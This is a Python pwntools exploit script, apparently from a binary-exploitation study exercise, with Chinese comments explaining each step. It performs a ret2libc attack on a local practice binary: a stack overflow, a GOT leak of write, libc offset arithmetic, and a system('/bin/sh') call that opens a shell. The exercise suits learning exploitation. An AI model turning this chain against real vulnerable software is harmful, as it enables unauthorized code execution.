from pwn import *

'''
    重点掌握的PWN脚本: 其攻击原理为:
        1.寻找栈注入、溢出点,通过组成gadget攻击链劫持控制流实现PWN
        2.通过plt.got表泄露libc函数存放在虚拟内存的地址
        3.通过多次调用read函数多次注入payload,使得可以在脚本使用返回值进行二次攻击
        4.通过pop|ret恢复栈平衡,使得程序可以正常返回数据
'''


def ret2_libc3_2(file_name='/mnt/hgfs/Cyber Security PWN/test/pwn3/level3'):
    # 前置：文件载入
    io = process([file_name])
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    elf = ELF(file_name)

    # 前置：准备gadget
    pop_ret_gadget = p32(0x0804851b)  # pop ebp ; ret
    pop3_ret_gadget = p32(0x08048519)  # pop esi ; pop edi ; pop ebp ; ret

    # 前置：准备
    write_plt = p32(elf.plt['write'])
    write_got = p32(elf.got['write'])
    read_text = p32(0x0804844B)

    # 第一次payload：劫持调用write函数泄露存放write的get.plt内存地址、调用read再次注入payload_2
    payload_1 = b'A' * 140

    # write("%p", *write_got)
    payload_1 += write_plt + pop3_ret_gadget + p32(0x1) + write_got + p32(0x4)

    # read(0, buf, 0x100u)
    payload_1 += read_text

    print(io.recv())

    io.sendline(payload_1)

    write_text = int.from_bytes(io.recv(4), "little")
    print(hex(write_text))

    '''
    定位libc文件存放在虚拟内存的相对位置,其等价于:
        system_libc = p32(write_libc - (write_libc - system_libc))
        bin_sh_libc = p32(write_libc + (bin_sh_libc - write_libc))
    '''
    write_libc = libc.symbols['write']  # 0x000D43C0
    system_libc = libc.symbols['system']  # 0x0003A940
    bin_sh_libc = next(libc.search(b'/bin/sh'))  # 0x0015902B

    system_text = p32(write_text - (write_libc - system_libc))
    bin_sh_rodata = p32(write_text + (bin_sh_libc - write_libc))

    payload_2 = b'A' * 140
    payload_2 += system_text + pop_ret_gadget + bin_sh_rodata

    io.sendline(payload_2)

    io.interactive()


if __name__ == '__main__':
    ret2_libc3_2()
